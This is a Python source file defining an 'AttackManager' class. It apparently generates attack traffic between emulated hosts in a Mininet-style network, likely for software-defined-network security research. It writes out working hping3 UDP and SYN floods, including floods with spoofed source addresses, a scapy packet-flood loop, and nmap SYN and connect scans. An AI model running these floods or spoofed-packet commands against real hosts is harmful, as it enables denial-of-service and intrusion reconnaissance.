import random
import time

class AttackManager:

    def __init__(self, net):
        self.net = net
        self.attackers = [net.get(f'h{i}') for i in range(1, 6)]
        self.victim = net.get('h7')
        self.active_pids = []

    # ================================
    # DDoS
    # ================================
    def ddos_flood(self, duration=30):
        print("[*] Starting DDoS flood...")

        for attacker in self.attackers:
            cmd = f'hping3 --flood --udp -p 80 {self.victim.IP()} & echo $!'
            pid = attacker.cmd(cmd).strip()
            self.active_pids.append((attacker, pid))

        time.sleep(duration)
        self.stop_all()

    # ================================
    # Packet-In Flood
    # ================================
    def packet_in_flood(self, duration=30):
        attacker = random.choice(self.attackers)
        print("[*] Packet-In Flood attack...")

        cmd = f'python3 -c "from scapy.all import *; send(IP(dst=\\"{self.victim.IP()}\\")/TCP(sport=RandShort(), dport=RandShort()), loop=1, verbose=0)" & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

        time.sleep(duration)
        self.stop_all()

    # ================================
    # Flow Table Overflow
    # ================================
    def flow_overflow(self, duration=30):
        attacker = random.choice(self.attackers)
        print("[*] Flow Table Overflow...")

        cmd = f'nmap -sS -p 1-5000 {self.victim.IP()} & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

        time.sleep(duration)
        self.stop_all()

    # ================================
    # IP Spoofing
    # ================================
    def ip_spoofing(self, duration=30):
        attacker = random.choice(self.attackers)
        fake_ip = f"10.0.0.{random.randint(100,200)}"
        print(f"[*] IP Spoofing from {fake_ip}")

        cmd = f'hping3 -c 10000 -d 120 -S -a {fake_ip} {self.victim.IP()} & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

        time.sleep(duration)
        self.stop_all()

    # ================================
    # Port Scanning
    # ================================
    def port_scanning(self, duration=30):
        attacker = random.choice(self.attackers)
        print("[*] Port Scanning...")

        cmd = f'nmap -sT {self.victim.IP()} & echo $!'
        pid = attacker.cmd(cmd).strip()
        self.active_pids.append((attacker, pid))

        time.sleep(duration)
        self.stop_all()

    # ================================
    # STOP ALL
    # ================================
    def stop_all(self):
        print("[*] Stopping all attacks...")
        for attacker, pid in self.active_pids:
            attacker.cmd(f'kill -9 {pid}')
        self.active_pids.clear()
